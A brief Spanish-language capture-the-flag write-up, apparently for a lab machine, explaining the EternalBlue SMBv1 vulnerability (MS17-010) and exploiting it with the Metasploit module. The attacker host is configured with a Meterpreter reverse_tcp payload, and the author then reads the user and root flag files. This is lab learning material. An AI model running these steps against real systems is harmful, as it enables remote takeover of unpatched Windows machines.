## EternalBlue

EternalBlue es tanto el nombre que reciben una serie de vulnerabilidades del software de Microsoft como el exploit creado por la NSA como herramienta de ciberataque. Aunque el exploit EternalBlue (denominado oficialmente MS17-010 por Microsoft) solo afecta a los sistemas operativos Windows, cualquier cosa que use el protocolo de intercambio de archivos SMBv1 (Server Message Block versión 1) está técnicamente en riesgo de ser objetivo de ransomware y otros ciberataques.


## Explotacion

Se busco en metaexploit dicha vulnerabilidad (MS17-010)
Se utilizo el siguiente modulo para explotar: 

  0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

Se cambiaron las opciones de configuracion segun necesidades:
- Rhost: IP maquina victima
- Lhost: IP maquina atacante
- Payload: windows/x64/meterpreter/reverse_tcp

## Resultado

Comprobamos privilegios:

meterpreter > getuid

Abrimos una shell y buscamos las flags en los directorios:

C:\Users\Administrator\Desktop>more root.txt

C:\Users\haris\Desktop>more user.txt

Mientras buscaba las flags me arrojo este error: 

[*] 10.129.68.74 - Meterpreter session 1 closed.  Reason: Died

Lo que he hecho es terminar la sesion y cerrar el exploit y volverlo a explotar y ya sin ningun problema he podido obtener las flags.
